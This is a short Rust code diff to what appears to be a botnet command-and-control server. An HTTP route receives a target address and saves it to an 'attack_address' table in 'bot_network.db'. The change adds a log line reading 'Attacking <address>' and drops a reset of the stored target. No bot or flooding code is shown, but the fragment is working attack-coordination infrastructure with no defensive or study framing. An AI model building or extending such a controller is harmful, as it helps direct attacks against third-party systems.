@@ -22,8 +22,6 @@ fn create_tables (conn: &Connection){
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              address TEXT)"
                  ,[]).unwrap();
-    conn.execute("DELETE FROM attack_address", []).unwrap();
-    conn.execute("INSERT INTO attack_address (address) VALUES (?1)", [""]).unwrap();
 }
 fn main() {
     let mut router = Router::new();
@@ -78,6 +76,7 @@ fn main() {
             };
             let conn = Connection::open("bot_network.db").unwrap();
             create_tables(&conn);
+            println!("Attacking {}", _received["address"].to_string());
             conn.execute("DELETE FROM attack_address", []).unwrap();
             conn.execute("INSERT INTO attack_address (address) VALUES (?1)", [_received["address"].to_string()]).unwrap();
             Ok(Response::with((status::Ok, "ok")))
